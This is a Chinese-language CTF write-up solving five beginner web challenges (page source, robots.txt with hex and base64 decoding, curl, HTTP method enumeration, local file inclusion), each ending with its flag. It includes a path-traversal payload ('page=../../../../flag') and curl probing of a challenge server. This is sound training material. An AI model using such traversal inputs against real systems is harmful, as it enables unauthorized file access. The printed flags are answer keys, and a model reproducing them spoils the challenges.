# Web101

## Web-1:source code

解題步驟1:按下鍵盤F12/滑鼠右鍵=>檢查

>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-1.png)

解答:

>BreakALLCTF{3xjVYR8dMetWQbwzYsLJ}


## web-2:Robots.txt

解題步驟1:在網址後方打上/robots.txt

>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-2(1).png)

解題步驟2:按下Enter後，出現文字<br>
User-agent: *
Disallow: /images
Disallow: /secret
==>在網址後方打上/secret

>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-2(2).png)
>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-2(3).png)

解題步驟3:點下flag.txt

>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-2(4).png)

解題步驟4:hex to string

>echo 516e4a6c595774425445784456455a374e31463053304979546a5655624846425155563651334a36546b3939 | xxd -r -p

解題步驟5:base64 decode

>echo QnJlYWtBTExDVEZ7N1F0S0IyTjVUbHFBQUV6Q3J6Tk99 | base64 --decode
>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-2(5).png)

解答:

>BreakALLCTF{7QtKB2N5TlqAAEzCrzNO}

也可使用線上解碼工具:
>https://codebeautify.org/hex-string-converter<br>
>https://www.base64decode.org/<br>


## Web-3:Curl-1

解題步驟1:在'GO!'圖示上按下滑鼠右鍵檢查

>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-3(1).png)

解題步驟2:發現網頁index.php
==>使用curl工具

>curl http://120.114.62.89:2014/index.php<br>
>curl -x Get -v http://120.114.62.89:2014/index.php<br>
>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web-3(2).png)

解答:

>BreakALLCTF{91YODwgPD58gpC4H9AeD}


## web-4:HTTP method

解題步驟1:使用curl工具<br>
==>curl -X GET,POST,OPTIONS,HEAD -v http://120.114.62.89:3001/index.php

curl -X GET -v http://120.114.62.89:3001/index.php
```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
> GET /index.php HTTP/1.1
> Host: 120.114.62.89:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 501 Not Implemented
< Date: Tue, 29 May 2018 16:35:06 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 199
< Connection: close
< Content-Type: text/html
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>501 Not Implemented</title>
</head><body>
<h1>Not Implemented</h1>
<p>GET to /index.php not supported.<br />
</p>
* Closing connection 0
</body></html>
```
curl -X POST -v http://120.114.62.89:3001/index.php
```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
> POST /index.php HTTP/1.1
> Host: 120.114.62.89:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 501 Not Implemented
< Date: Tue, 29 May 2018 16:40:40 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 200
< Connection: close
< Content-Type: text/html
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>501 Not Implemented</title>
</head><body>
<h1>Not Implemented</h1>
<p>POST to /index.php not supported.<br />
</p>
* Closing connection 0
</body></html>
```
curl -X HEAD -v http://120.114.62.89:3001/index.php
```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
> HEAD /index.php HTTP/1.1
> Host: 120.114.62.89:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 501 Not Implemented
< Date: Tue, 29 May 2018 16:40:57 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Connection: close
< Content-Type: text/html
< 
* Closing connection 0
```
curl -X OPTIONS -v http://120.114.62.89:3001/index.php
```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
> OPTIONS /index.php HTTP/1.1
> Host: 120.114.62.89:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Tue, 29 May 2018 16:41:17 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Allow: GETFLAG,OPTIONS
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host 120.114.62.89 left intact
```

解題步驟2:發現可使用GETFLAG

curl -X GETFLAG -v http://120.114.62.89:3001/index.php
```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
> GETFLAG /index.php HTTP/1.1
> Host: 120.114.62.89:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Tue, 29 May 2018 16:41:33 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 33
< Content-Type: text/html
< 
* Connection #0 to host 120.114.62.89 left intact
BreakALLCTF{fzfaD1jdXyQAMWvRShGC}
```

解答:

>BreakALLCTF{fzfaD1jdXyQAMWvRShGC}

HTTP狀態碼:
>https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
```
200 OK
請求已成功，請求所希望的回應頭或資料體將隨此回應返回。實際的回應將取決於所使用的請求方法。在GET請求中，回應將包含與請求的資源相對應的實體。在POST請求中，回應將包含描述或操作結果的實體。
501 Not Implemented
伺服器不支援當前請求所需要的某個功能。當伺服器無法識別請求的方法，並且無法支援其對任何資源的請求。
```

## web-5:Local File Inclusion

解題步驟1:從最底層的資料夾找起

>http://120.114.62.89:2003/index.php?page=flag

解題步驟2:再往上層資料夾尋找

>http://120.114.62.89:2003/index.php?page=../flag

解題步驟3:最終在第四層資料夾找到

>http://120.114.62.89:2003/index.php?page=../../../../flag
>![image](https://github.com/saho-yu/CTF2018/blob/master/Web/pictures/web%20-5.png)

解答:

>BreakALLCTF{887cs9oKULT0lvtY2bVu} 
